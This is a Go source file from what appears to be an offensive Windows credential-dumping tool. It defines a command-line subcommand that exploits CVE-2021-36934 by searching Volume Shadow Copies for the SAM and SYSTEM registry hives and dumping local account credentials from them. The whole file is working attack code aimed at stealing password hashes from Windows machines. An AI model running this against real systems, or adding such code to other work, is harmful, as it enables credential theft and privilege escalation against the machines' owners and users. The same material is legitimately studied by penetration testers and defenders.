package sam

import (
	"fmt"
	"os"

	"github.com/spf13/cobra"

	"github.com/vincd/savoir/modules/windows"
)

func init() {
	var isJson bool

	var shadowcopiesCommand = &cobra.Command{
		Use:   "shadowcopies",
		Short: "Search hives in ShadowCopy volumes (CVE-2021-36934)",
		Long:  `Search hives in ShadowCopy volumes (CVE-2021-36934)`,
		Args: func(cmd *cobra.Command, args []string) error {
			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			shadowCopies, err := windows.ListShadowCopies()
			if err != nil {
				return nil
			}

			if len(shadowCopies) == 0 {
				fmt.Println("Cannot found any shodowcopy.")
				return nil
			}

			for _, shadowCopyPath := range shadowCopies {
				systemPath := fmt.Sprintf("%s\\SYSTEM", shadowCopyPath)
				if _, err := os.Stat(systemPath); os.IsNotExist(err) {
					continue
				}

				samPath := fmt.Sprintf("%s\\SAM", shadowCopyPath)
				if _, err := os.Stat(samPath); os.IsNotExist(err) {
					continue
				}

				err := DumpSAMCredentialsFromHives(samPath, systemPath, isJson)
				if err != nil {
					fmt.Printf("Cannot dump credentials from %s: %s\n", shadowCopyPath, err)
				}
			}

			return nil
		},
	}
	shadowcopiesCommand.Flags().BoolVarP(&isJson, "json", "j", false, "Print output as a JSON object")

	Command.AddCommand(shadowcopiesCommand)
}
